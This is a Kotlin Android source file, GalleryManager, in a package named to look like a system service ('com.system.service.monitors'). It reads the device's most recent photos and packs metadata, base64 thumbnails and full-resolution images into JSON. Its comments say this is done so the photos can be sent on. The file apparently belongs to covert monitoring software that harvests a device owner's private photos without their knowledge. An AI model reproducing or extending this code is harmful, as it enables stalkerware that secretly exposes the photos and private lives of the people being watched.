package com.system.service.monitors

import android.content.Context
import android.database.Cursor
import android.provider.MediaStore
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object GalleryManager {

    /** Last N photos ki list bhejo (thumbnails ke saath) */
    fun getRecentPhotos(context: Context, limit: Int = 20): JSONArray {
        val result = JSONArray()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.SIZE
        )
        val cursor: Cursor? = context.contentResolver.query(
            uri, projection, null, null,
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )
        cursor?.use {
            val colId   = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val colName = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val colPath = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val colDate = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            val colSize = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            var count = 0
            while (it.moveToNext() && count < limit) {
                val path = it.getString(colPath) ?: continue
                val file = File(path)
                if (!file.exists()) continue
                val obj = JSONObject().apply {
                    put("id",   it.getLong(colId))
                    put("name", it.getString(colName))
                    put("date", it.getLong(colDate) * 1000L)
                    put("size", it.getLong(colSize))
                    put("path", path)
                }
                // Thumbnail (scaled down to 200px)
                try {
                    val bmp = android.media.ThumbnailUtils.createImageThumbnail(
                        path, android.util.Size(200, 200), null)
                    val baos = java.io.ByteArrayOutputStream()
                    bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, baos)
                    obj.put("thumb", Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
                } catch (_: Exception) {}
                result.put(obj)
                count++
            }
        }
        return result
    }

    /** Full image bhejo (compressed) */
    fun getFullPhoto(context: Context, path: String): String? {
        return try {
            val bmp = android.graphics.BitmapFactory.decodeFile(path) ?: return null
            // Scale to max 1080p
            val maxDim = 1080
            val scale = maxOf(bmp.width, bmp.height).toFloat() / maxDim
            val scaled = if (scale > 1f)
                android.graphics.Bitmap.createScaledBitmap(
                    bmp, (bmp.width/scale).toInt(), (bmp.height/scale).toInt(), true)
            else bmp
            val baos = java.io.ByteArrayOutputStream()
            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos)
            Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) { null }
    }
}
